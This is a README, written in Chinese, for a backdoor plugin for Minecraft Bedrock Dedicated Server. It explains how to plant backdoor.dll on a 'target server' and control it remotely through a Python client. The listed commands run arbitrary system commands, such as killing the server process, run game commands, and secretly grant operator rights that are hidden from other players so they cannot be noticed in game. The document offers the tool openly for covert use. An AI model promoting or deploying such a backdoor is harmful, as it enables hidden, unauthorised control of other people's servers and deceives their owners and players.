# backdoor

一个适用于Bedrock Dedicated Server的后门插件

## 使用
1. 将``backdoor.dll``安装到目标服务器
2. 待目标服务器开启后使用后门客户端``client.py``进行远控，以下是其使用方法

## 运行后门客户端
安装Python后在命令行中使用以下命令来运行程序：

```
python client.py
```

输入服务器IP和端口
启动程序时会提示你输入服务器的IP地址和端口号，格式为 IP地址 端口号（例如 127.0.0.1 19132）

示例：

```
Please input server ip:port like 127.0.0.1 19132
114.51.41.91 9810
```

客户端功能
客户端程序具有以下功能：

``scmd [cmd]`` - 执行系统命令
``gcmd [cmd]`` - 执行游戏命令
``perm [玩家名称:区分大小写] [等级: 0~3] [0: 客户端隐藏变化 | 1: 客户端显示变化]`` - 设置玩家权限级别
``q`` - 退出程序

请根据需要输入相应的命令来执行相应的操作。例如，要执行游戏命令``kick WillowSauceR``，输入以下命令：

```
>>> gcmd kick WillowSauceR
```

执行系统命令``taskkill /F /IM bedrock_server.exe``
```
>>> scmd taskkill /F /IM bedrock_server.exe
```

给游戏中的玩家设置权限
权限等级：0为普通玩家，大于0为OP
显示/隐藏：对其他玩家和自己隐藏权限变化，无法在游戏内发现
以下命令为玩家``WillowSauceR``设置了OP权限且对其他玩家隐藏
```
>>> perm WillowSauceR 1 0
```

要退出程序，输入以下命令：

```
>>> q
```
